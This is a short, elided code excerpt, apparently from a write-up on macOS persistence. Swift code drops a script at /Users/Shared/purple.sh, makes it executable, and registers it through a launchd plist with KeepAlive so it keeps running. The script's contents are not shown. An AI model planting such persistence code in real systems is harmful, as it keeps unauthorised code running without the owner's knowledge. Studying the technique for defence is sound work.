...
do {
    ...
    try fileMan.createFile(atPath: "/Users/Shared/purple.sh", contents: script2, attributes: nil)

    var attributes = [FileAttributeKey: Any]()
    attributes[.posixPermissions] = 0o755
    try fileMan.setAttributes(attributes, ofItemAtPath: "/Users/Shared/purple.sh")
    ...
    <dict>
        ...
        <array>
            <string>bash</string>
            <string>-c</string>
            <string>/Users/Shared/purple.sh</string>
        </array>
        <key>KeepAlive</key>
        <true/>
    </dict>
